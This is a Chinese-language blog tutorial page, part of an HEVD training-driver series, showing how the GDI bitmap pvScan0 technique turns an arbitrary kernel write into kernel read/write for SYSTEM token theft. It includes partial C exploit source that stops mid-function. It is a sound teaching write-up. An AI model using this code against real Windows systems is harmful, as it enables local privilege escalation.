@@ -1,0 +1,955 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+        <link rel="canonical" href="https://50u1w4y.github.io/HEVD/bitmap/">
+      
+      
+        <meta name="author" content="50u1w4y">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.0">
+    
+    
+      
+        <title>bitmap 任意地址写漏洞利用 - 50u1w4y</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.0284f74d.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.01803549.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.74668098.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="indigo">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#0x00" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://50u1w4y.github.io" title="50u1w4y" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              50u1w4y
+            </span>
+            <span class="md-header-nav__topic">
+              
+                bitmap 任意地址写漏洞利用
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." title="Welcome" class="md-tabs__link">
+        Welcome
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../homePage/" title="HEVD" class="md-tabs__link md-tabs__link--active">
+          HEVD
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../misc/homePage/" title="胡说" class="md-tabs__link">
+          胡说
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://50u1w4y.github.io" title="50u1w4y" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    50u1w4y
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Welcome" class="md-nav__link">
+      Welcome
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      HEVD
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        HEVD
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../homePage/" title="Home Page" class="md-nav__link">
+      Home Page
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../buildEnv/" title="HEVD 环境搭建" class="md-nav__link">
+      HEVD 环境搭建
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../stackoverflow/" title="（一）HEVD 栈溢出" class="md-nav__link">
+      （一）HEVD 栈溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../arbitraryWrite/" title="（二）HEVD 任意地址覆盖" class="md-nav__link">
+      （二）HEVD 任意地址覆盖
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../nonPagedpooloverflow/" title="（三）HEVD 非换页池溢出" class="md-nav__link">
+      （三）HEVD 非换页池溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../nullpointerDereference/" title="（四）HEVD 空指针引用" class="md-nav__link">
+      （四）HEVD 空指针引用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../uninitializedStackVariable/" title="（五）HEVD 未初始化栈变量" class="md-nav__link">
+      （五）HEVD 未初始化栈变量
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../uninitializedHeapVariable/" title="（六）HEVD 未初始化堆变量" class="md-nav__link">
+      （六）HEVD 未初始化堆变量
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../useAfterFree/" title="（七）HEVD Use After Free" class="md-nav__link">
+      （七）HEVD Use After Free
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        bitmap 任意地址写漏洞利用
+      </label>
+    
+    <a href="./" title="bitmap 任意地址写漏洞利用" class="md-nav__link md-nav__link--active">
+      bitmap 任意地址写漏洞利用
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x00" title="0x00 前言" class="md-nav__link">
+    0x00 前言
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x01-bitmap" title="0x01 bitmap 是什么" class="md-nav__link">
+    0x01 bitmap 是什么
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02-bitmap" title="0x02 bitmap 的作用" class="md-nav__link">
+    0x02 bitmap 的作用
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03-bitmap" title="0x03 如何使用 bitmap" class="md-nav__link">
+    0x03 如何使用 bitmap
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x04-bitmap" title="0x04 bitmap 任意地址写漏洞利用" class="md-nav__link">
+    0x04 bitmap 任意地址写漏洞利用
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x05" title="0x05 结束语" class="md-nav__link">
+    0x05 结束语
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      胡说
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        胡说
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../misc/homePage/" title="Home Page" class="md-nav__link">
+      Home Page
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../misc/gitalkBuild/" title="mkdocs-material 搭建 gitalk" class="md-nav__link">
+      mkdocs-material 搭建 gitalk
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x00" title="0x00 前言" class="md-nav__link">
+    0x00 前言
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x01-bitmap" title="0x01 bitmap 是什么" class="md-nav__link">
+    0x01 bitmap 是什么
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02-bitmap" title="0x02 bitmap 的作用" class="md-nav__link">
+    0x02 bitmap 的作用
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03-bitmap" title="0x03 如何使用 bitmap" class="md-nav__link">
+    0x03 如何使用 bitmap
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x04-bitmap" title="0x04 bitmap 任意地址写漏洞利用" class="md-nav__link">
+    0x04 bitmap 任意地址写漏洞利用
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x05" title="0x05 结束语" class="md-nav__link">
+    0x05 结束语
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>bitmap 任意地址写漏洞利用</h1>
+                
+                <p><small>转载请注明出处哦 :  )</small></p>
+<h2 id="0x00">0x00 前言<a class="headerlink" href="#0x00" title="Permanent link">&para;</a></h2>
+<p>还记得第二篇任意地址覆盖中我们通过任意地址写漏洞修改了 [HalDispatchTable+0x4] 来达到执行我们 shellcode 的目的吗？但是我们毕竟修改了 Hal 的分发表，一个最底层的分发表，虽然那段程序执行起来没有问题，但指不定什么时候就使系统崩溃了，这是一个隐患。虽然我当时也有这么想过，但直接用这个东西很少被调用把自己说服了 : )</p>
+<p>直到有人问我假若我们有一个任意地址写漏洞，就像第二篇文章那样，那么我们有没有什么更稳定的方法呢？</p>
+<p>在此先感谢一下 @wjllz 的帮助</p>
+<h2 id="0x01-bitmap">0x01 bitmap 是什么<a class="headerlink" href="#0x01-bitmap" title="Permanent link">&para;</a></h2>
+<p>我们先看看官方文档</p>
+<p><img alt="alt 1" src="../images/bitmap/1.jpg" /></p>
+<p>这一看就是个跟 gdi 有关的绘图的东西，这显然不是我们感兴趣的，但不急，首先我们看看 CreateBitmap 会创建一个什么样的结构。</p>
+<p><img alt="alt 2" src="../images/bitmap/2.png" /></p>
+<p>(这张图不是我画的，不过这张图在网上传得挺广的，所有的图片应该是出自同一个人，只不过我不知道是谁，下面看起来明显是同一个画风的那张图应该也是这个人画的)</p>
+<p>说白了其实就是创建了两个结构，一个叫 BASEOBJECT，每一个 GDI 对象都有的一个头部。另一个叫 SURFOBJ，保存了包括我们参数信息的实际结构。</p>
+<p>我们先看看 BASEOBJECT</p>
+<p><img alt="alt 3" src="../images/bitmap/3.jpg" /></p>
+<p>这个对象在这里其实没什么用，我们只要记住它的偏移就好了</p>
+<div class="codehilite"><pre><span></span>x86 : 0x10
+x64 : 0x18
+</pre></div>
+
+<p>再来看看 SURFOBJ</p>
+<p><img alt="alt 4" src="../images/bitmap/4.jpg" /></p>
+<p>其它参数都不重要，我们看到 pvScan0</p>
+<p>结合上面那张图，pvScan0 指向一块 Pixel Data 数据区，我们可以通过 GetBitmapBits 和 SetBitmapBits 来控制那块数据区。</p>
+<p>GetbitmapBits:
+<img alt="alt 6" src="../images/bitmap/6.jpg" /></p>
+<p>SetbitmapBits:
+<img alt="alt 7" src="../images/bitmap/7.jpg" /></p>
+<h2 id="0x02-bitmap">0x02 bitmap 的作用<a class="headerlink" href="#0x02-bitmap" title="Permanent link">&para;</a></h2>
+<p>到目前为止，我们应该已经大致清楚了 CreateBitmap 所创建的内核对象大致是一个什么样的结构了，那么，这有什么用呢？我们所说的作用当然不是它本来与 gdi 相关的作用，而是对我们的漏洞利用有什么帮助呢？</p>
+<p>上面说到，pvScan0 指向一块 Pixel Data 数据区，我们可以通过 GetBitmapBits 和 SetBitmapBits 来控制那块数据区。不过，注意到 SURFOBJ 是一个处于内核地址空间下的对象，pvScan0 所指向的 Pixel Data 数据区也是位于内核地址空间下的，也就是说，我们可以在用户模式下通过 GetBitmapBits 和 SetBitmapBits 来控制内核地址空间中的数据了，只要我们有办法控制 pvScan0 的值，这不就是一个任意地址读写的漏洞吗？</p>
+<p>那么我们该怎么控制 pvScan0 的值呢？其实 pvScan0 和 CreateBitmap 的第五个参数是相对应的，我们看看第五个参数和 pvScan0 怎么说</p>
+<p><img alt="alt 8" src="../images/bitmap/8.jpg" /></p>
+<p><img alt="alt 5" src="../images/bitmap/5.jpg" /></p>
+<p>这里根据我的调试结果，如果我们给 CreateBitmap 的第五个参数随便指定一个我们想要的地址的话，效果类似这样的代码</p>
+<div class="codehilite"><pre><span></span>HBITMAP hManager = CreateBitmap(0x20, 0x20, 0x1, 0x8, (PDWORD32)WorkerpvScan0Address);
+</pre></div>
+
+<p>那么 hManager 会直接为 NULL,也就是说创建失败了。换句话说，我们没办法随意控制 pvScan0 的值，顶多只能让 pvScan0 指向一块有意义的区域。</p>
+<p>所以我们其实是需要一个任意地址写漏洞来控制 pvScan0 的值的（控制 pvScan0 的值之后我们还能获得任意地址读权限）</p>
+<p>总结一下，如果我们有一个任意地址写漏洞的话，我们就能通过 bitmap 来获得任意地址读写权限，这就是 bitmap 的作用</p>
+<h2 id="0x03-bitmap">0x03 如何使用 bitmap<a class="headerlink" href="#0x03-bitmap" title="Permanent link">&para;</a></h2>
+<p>那么，假若我们有一个任意地址写漏洞的话，我们该往哪里写我们想要控制的区域的地址呢？换句话说，怎么获得 pvScan0 的地址？</p>
+<p>首先，我们知道 fs 在用户模式下指向 teb，在内核模式下指向 pcr，虽然我们可以直接通过 NtCurrentTeb 来获得 teb 的基址。teb 中的 ProcessEnvironmentBlock 指向线程所在的进程 peb。peb 偏移 0x094 的地方（x86下）是一个指向 GDICELL 结构体数组的指针 GdiSharedHandleTableAddr</p>
+<p>通过 CreateBitmap 返回的 handle 值我们可以得到该 bitmap 的 GDICELL 结构体的索引，计算方法为</p>
+<div class="codehilite"><pre><span></span><span class="n">DWORD32</span> <span class="n">pKernelAddress</span> <span class="o">=</span> <span class="n">GdiSharedHandleTableAddr</span> <span class="o">+</span> <span class="p">((</span><span class="n">DWORD32</span><span class="p">)</span> <span class="n">handle</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="nl">x86</span><span class="p">:</span><span class="mh">0x10</span><span class="p">,</span><span class="nl">x64</span><span class="p">:</span><span class="mh">0x18</span><span class="p">);</span>
+</pre></div>
+
+<p>没错，通过 GdiSharedHandleTableAddr 指针我们就能找到 pvScan0 的地址，但是在 windows 10 1607 及其以后的版本，GdiSharedHandleTableAddr 指针指向的区域变为了 ????，也就是一个未分配的区域，换句话说就是这个利用方法被打上了补丁，因为我们没法得到 pvScan0 的地址了。</p>
+<p>回到原文，GDICELL 结构体的结构为
+<div class="codehilite"><pre><span></span><span class="c1">/// 32bit size: 0x10</span>
+<span class="c1">/// 64bit size: 0x18</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_GDI_CELL</span>
+<span class="p">{</span>
+    <span class="n">IntPtr</span> <span class="n">pKernelAddress</span><span class="p">;</span>
+    <span class="n">UInt16</span> <span class="n">wProcessId</span><span class="p">;</span>
+    <span class="n">UInt16</span> <span class="n">wCount</span><span class="p">;</span>
+    <span class="n">UInt16</span> <span class="n">wUpper</span><span class="p">;</span>
+    <span class="n">UInt16</span> <span class="n">wType</span><span class="p">;</span>
+    <span class="n">IntPtr</span> <span class="n">pUserAddress</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div></p>
+<p>其第一个指针 pKernelAddress 指向了 BASEOBJECT 的第一个字节，也就是说 *(PDWORD32)pKernelAddress + (x86:0x10,x64:0x18) + (x86:0x20,x64:0x38) 正是 pvScan0 的地址</p>
+<h2 id="0x04-bitmap">0x04 bitmap 任意地址写漏洞利用<a class="headerlink" href="#0x04-bitmap" title="Permanent link">&para;</a></h2>
+<p>到目前为止，其实 bitmap 的利用已经很清晰了</p>
+<blockquote>
+<ol>
+<li>调用 CreateBitmap 创建 bitmap 内核对象</li>
+<li>通过 teb 获得 pvScan0 的地址</li>
+<li>通过任意地址写漏洞改写 pvScan0 的值为我们想要读的地址</li>
+<li>调用 GetBitmapBits 来读取数据</li>
+</ol>
+</blockquote>
+<p>接下来就以第二篇文章的漏洞来提权验证一下 bitmap 的使用</p>
+<p>在开始之前，先看一下这张图</p>
+<p><img alt="alt 9" src="../images/bitmap/9.png" /></p>
+<p>我们可以通过创建两个 bitmap，一个用来控制我们要读写的地址，一个用来实际对那块地址进行读写，这样子操作起来会舒服很多，写起代码来也更清晰简洁。</p>
+<p>由于我们之后不在内核模式下执行我们的 shellcode，因此我们需要在用户模式下模拟这个过程（我们可以对任意地址进行读写）</p>
+<p>总结一下我们应该要做的事</p>
+<blockquote>
+<ol>
+<li>创建两个 bitmap，分别为 hManager 和 hWorker</li>
+<li>通过任意地址写漏洞改写 hManager 的 pvScan0 的值为 hWorker 的 pvScan0 的地址</li>
+<li>结合 GetBitmapBits 和 SetBitmapBits，利用 hManager 和 hWorker 读取 system 的 token</li>
+<li>把 system 的 token 赋予我们的当前进程</li>
+<li>验证提权</li>
+</ol>
+</blockquote>
+<p>这里补充一下两个小知识</p>
+<p>第一个是 ntoskrnl.exe 中有个叫 PsInitialSystemProcess 的全局变量（指针），其指向 system 进程的 eprocess</p>
+<p><img alt="alt 10" src="../images/bitmap/10.jpg" /></p>
+<p>第二个是内核在不同的环境下有不同的名字</p>
+<p><img alt="alt 11" src="../images/bitmap/11.jpg" /></p>
+<p>到现在应该把每一个点都说清楚了，接下来贴出任意地址写漏洞的 bitmap 利用方法 （之前是改写 [HalDispatchTable+0x4] 来执行 shellcode）</p>
+<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&quot;stdafx.h&quot;</span><span class="cp"></span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp"></span>
+
+<span class="n">TCHAR</span> <span class="n">driverName</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_payload</span> <span class="p">{</span>
+    <span class="n">PULONG_PTR</span> <span class="n">what</span><span class="p">;</span>
+    <span class="n">PULONG_PTR</span> <span class="n">where</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">Payload</span><span class="p">,</span> <span class="o">*</span><span class="n">PPayload</span><span class="p">;</span>
+
+<span class="n">VOID</span> <span class="nf">readOOB</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">hManager</span><span class="p">,</span> <span class="n">HBITMAP</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">DWORD32</span> <span class="n">whereWrite</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">whatWrite</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">whereWrite</span><span class="p">);</span> <span class="c1">// set 写的是 hWorker 的 pvScan0 的值</span>
+                                               <span class="c1">// 通过控制 hWorker 的 pvScan0 的值来决定对哪块地址进行读写</span>
+    <span class="n">GetBitmapBits</span><span class="p">(</span><span class="n">hWorker</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">whatWrite</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">VOID</span> <span class="nf">writeOOB</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">hManager</span><span class="p">,</span> <span class="n">HBITMAP</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">DWORD32</span> <span class="n">whereWrite</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">whatWrite</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">whereWrite</span><span class="p">);</span>
+    <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hWorker</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">whatWrite</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">DWORD32</span> <span class="nf">getpvScan0Address</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">handle</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;    handle value: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,(</span><span class="n">DWORD32</span><span class="p">)</span> <span class="n">handle</span><span class="p">);</span>
+
+    <span class="n">DWORD32</span> <span class="n">tebAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">NtCurrentTeb</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;    tebAddr: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">tebAddr</span><span class="p">);</span>
+
+    <span class="n">DWORD32</span> <span class="n">pebAddr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">PDWORD32</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">tebAddr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;    pebAddr: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pebAddr</span><span class="p">);</span>
+
+    <span class="n">DWORD32</span> <span class="n">GdiSharedHandleTableAddr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">PDWORD32</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">pebAddr</span> <span class="o">+</span> <span class="mh">0x94</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;    GdiSharedHandleTableAddr: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GdiSharedHandleTableAddr</span><span class="p">);</span>
+
+    <span class="c1">// GdiSharedHandleTableAddr 是一个指向GDICELL结构体数组的指针</span>
+    <span class="c1">// GDICELL 结构体 x86 0x10,x64 0x18</span>
+    <span class="n">DWORD32</span> <span class="n">pKernelAddress</span> <span class="o">=</span> <span class="n">GdiSharedHandleTableAddr</span> <span class="o">+</span> <span class="p">((</span><span class="n">DWORD32</span><span class="p">)</span> <span class="n">handle</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;    pKernelAddress: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pKernelAddress</span><span class="p">);</span>
+
+    <span class="n">DWORD32</span> <span class="n">surfaceObject</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">PDWORD32</span><span class="p">)</span><span class="n">pKernelAddress</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;    surfaceObject address: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">surfaceObject</span><span class="p">);</span>
+    <span class="c1">// BASEOBJECT 结构体 x86 0x10,x64 0x18</span>
+    <span class="c1">// pvScan0 在 SURFOBJ 结构体中的偏移 x86 0x20,x64 0x38</span>
+    <span class="n">DWORD32</span> <span class="n">pvScan0Address</span> <span class="o">=</span> <span class="n">surfaceObject</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;    pvScan0 address: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pvScan0Address</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">pvScan0Address</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">DWORD32</span> <span class="nf">getKernelBase</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">PVOID</span> <span class="n">driversAddress</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+    <span class="n">DWORD</span> <span class="n">cbNeeded</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">cDrivers</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">ntoskrnlKernelBase</span><span class="p">;</span>
+
+    <span class="c1">// find ntoskrnl.exe kernel base</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">driversAddress</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">driversAddress</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cbNeeded</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">cbNeeded</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">driversAddress</span><span class="p">))</span>
+    <span class="p">{</span>
+
+        <span class="n">cDrivers</span> <span class="o">=</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">driversAddress</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+
+        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cDrivers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">GetDeviceDriverBaseName</span><span class="p">(</span><span class="n">driversAddress</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">driverName</span><span class="p">,</span> <span class="mi">1024</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="kt">char</span> <span class="o">*</span><span class="n">lowerName</span> <span class="o">=</span> <span class="n">_strlwr</span><span class="p">(</span><span class="n">driverName</span><span class="p">);</span>
+
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">driverName</span><span class="p">,</span> <span class="s">&quot;nt&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span> <span class="p">{</span>
+
